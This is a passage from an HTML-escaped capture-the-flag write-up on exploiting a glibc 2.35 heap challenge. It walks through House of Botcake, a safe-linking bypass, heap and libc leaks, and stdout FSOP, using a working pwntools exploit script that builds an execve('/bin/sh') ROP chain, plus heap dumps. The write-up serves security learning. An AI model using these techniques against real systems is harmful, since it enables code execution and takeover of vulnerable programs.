&lt;li&gt;free(a) again, given &lt;code&gt;a&lt;/code&gt; is part of the large &lt;code&gt;0x221&lt;/code&gt; sized chunk it leads to an UAF. Thus &lt;code&gt;a&lt;/code&gt; falls into the tcache.&lt;/li&gt;
&lt;li&gt;That&amp;rsquo;s finished, to get a write what where we just need to request a &lt;code&gt;0x130&lt;/code&gt; sized chunk. Thus we can hiijack the next fp of &lt;code&gt;a&lt;/code&gt; that is currently referenced by the tcache by the location we wanna write to. And next time two &lt;code&gt;0x100&lt;/code&gt; sized chunks are requested, the second one will be the target location.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;getting-arbitrary-write&#34;&gt;Getting arbitrary write&lt;/h2&gt;
&lt;p&gt;To make use of the write what were we got thanks to the &lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c&#34;&gt;House of botcake&lt;/a&gt;, we need to get both heap and libc leak. To leak libc that&amp;rsquo;s pretty easily we just need to print out a free&amp;rsquo;d chunk stored into the unsortedbin, it&amp;rsquo;s forward pointer is not encrypted with safe-linking.&lt;/p&gt;
&lt;p&gt;As seen previously, to bypass safe-linking we have to print a free&amp;rsquo;d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to &lt;code&gt;location ^ ((heap_base + chunk_offset) &amp;gt;&amp;gt; 12)&lt;/code&gt; to encrypt properly the pointer, this way the primitive is efficient.&lt;/p&gt;
&lt;p&gt;Implmentation of the &lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c&#34;&gt;House of botcake&lt;/a&gt; + safe-linking bypass, heap and libc leak:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;
io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start()

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;alloc&lt;/span&gt;(idx, data, size):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Index?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;, data) 

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt;(idx):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;view&lt;/span&gt;(idx):
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;) 
   io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
    alloc(i, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

free(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

view(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

heap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;heap @ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(heap)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# then we defeated safe linking lol&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# request back the chunk we used to leak the heap&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# prev&lt;/span&gt;
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# a&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# barrier&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# fill tcache&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
    free(i)

free(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# free(a) =&amp;gt; unsortedbin&lt;/span&gt;
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# free(prev) =&amp;gt; merged with a&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# leak libc&lt;/span&gt;
view(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x219ce0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# - 0x1bebe0 # offset of the unsorted bin&lt;/span&gt;

rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ROP(libc)
binsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;))
rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;execve(binsh, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

environ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x221200&lt;/span&gt;
stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21a780&lt;/span&gt;

pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;environ: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(environ)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stdout: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stdout)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;YY&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# pop a chunk from the tcache to let an entry left to a &lt;/span&gt;
free(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# free(a) =&amp;gt; tcache&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;T&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x108&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x111&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64((stdout &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((heap &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;))), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x130&lt;/span&gt;) 
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x130, too big for tcache =&amp;gt; unsortedbin UAF on a to replace a-&amp;gt;next with the address of the target location (stdout) &lt;/span&gt;
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TT&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# pop a from tcache&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# next 0x100 request will return the target location (stdout)&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a00:	0x0000000000000000	0x0000000000000141 [prev]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a10:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a20:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a30:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a40:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a50:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a60:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a70:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a80:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7a90:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7aa0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7ab0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7ac0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7ad0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7ae0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7af0:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b00:	0x5454545454545454	0x5454545454545454
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b10:	0x5454545454545454	0x0000000000000111 [a]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b20:	0x00007f5d45ff5b57	0x4f60331b73b9000a
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b30:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b40:	0x0000000000000000	0x00000000000000e1 [unsortedbin]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b50:	0x00007f5819b0dce0	0x00007f5819b0dce0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b60:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b70:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b80:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7b90:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7ba0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7bb0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7bc0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7bd0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7be0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7bf0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7c00:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7c10:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7c20:	0x00000000000000e0	0x0000000000000020
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7c30:	0x0068732f6e69622f	0x000000000000000a
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fsop-on-stdout-to-leak-environ&#34;&gt;FSOP on stdout to leak environ&lt;/h2&gt;
&lt;p&gt;I didn&amp;rsquo;t see first that only &lt;code&gt;PARTIAL RELRO&lt;/code&gt; was enabled on the libc, so the technique I show you here was thought to face a &lt;code&gt;2.35&lt;/code&gt; libc with &lt;code&gt;FULL RELRO&lt;/code&gt; enabled that the reason why I didn&amp;rsquo;t just hiijack some GOT pointers within the libc.&lt;/p&gt;
&lt;p&gt;A pretty convenient way to gain code execution when the hooks (&lt;code&gt;__malloc_hook&lt;/code&gt;, &lt;code&gt;__free_hook&lt;/code&gt;) are not present (since &lt;code&gt;2.32&lt;/code&gt; cf &lt;a href=&#34;https://sourceware.org/pipermail/libc-alpha/2021-August/129718.html&#34;&gt;this for 2.34&lt;/a&gt;) is to leak the address of the stack to then write a ROPchain on it. To leak a stack address we can make use of the &lt;code&gt;environ&lt;/code&gt; symbol stored in the dynamic linker, it contains a pointer toward &lt;code&gt;**envp&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To read this pointer we need a read what where primitive! Which can be achieved through a file stream oriented programming (FSOP) attack on &lt;code&gt;stdout&lt;/code&gt; for example. To dig more FSOP I advise you to read &lt;a href=&#34;https://nasm.re/posts/onceforall/&#34;&gt;this write-up&lt;/a&gt; as well as &lt;a href=&#34;https://nasm.re/posts/bookwriter/&#34;&gt;this one&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To understand the whole process I&amp;rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&amp;rsquo;s used ritght after the &lt;code&gt;fgets&lt;/code&gt; that reads the input from the user by the &lt;code&gt;putchar&lt;/code&gt; function. Basically on linux &amp;ldquo;everything is a file&amp;rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called &lt;code&gt;FILE&lt;/code&gt; you may have used if you have already done some stuff with files on linux. Here is its definition:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* The tag name of this struct is _IO_FILE to preserve historic
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   C++ mangled names for functions taking FILE* arguments.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   That name should not be used in new code.  */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_FILE
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; _flags;		&lt;span style=&#34;color:#75715e&#34;&gt;/* High-order word is _IO_MAGIC; rest is flags. */&lt;/span&gt;

  &lt;span style=&#34;color:#75715e&#34;&gt;/* The following pointers correspond to the C++ streambuf protocol. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_read_ptr;	&lt;span style=&#34;color:#75715e&#34;&gt;/* Current read pointer */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_read_end;	&lt;span style=&#34;color:#75715e&#34;&gt;/* End of get area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_read_base;	&lt;span style=&#34;color:#75715e&#34;&gt;/* Start of putback+get area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_write_base;	&lt;span style=&#34;color:#75715e&#34;&gt;/* Start of put area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_write_ptr;	&lt;span style=&#34;color:#75715e&#34;&gt;/* Current put pointer. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_write_end;	&lt;span style=&#34;color:#75715e&#34;&gt;/* End of put area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_buf_base;	&lt;span style=&#34;color:#75715e&#34;&gt;/* Start of reserve area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_buf_end;	&lt;span style=&#34;color:#75715e&#34;&gt;/* End of reserve area. */&lt;/span&gt;

  &lt;span style=&#34;color:#75715e&#34;&gt;/* The following fields are used to support backing up and undo. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_save_base; &lt;span style=&#34;color:#75715e&#34;&gt;/* Pointer to start of non-current get area. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_backup_base;  &lt;span style=&#34;color:#75715e&#34;&gt;/* Pointer to first valid character of backup area */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_IO_save_end; &lt;span style=&#34;color:#75715e&#34;&gt;/* Pointer to end of non-current get area. */&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_marker &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_markers;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_chain;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; _fileno;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; _flags2;
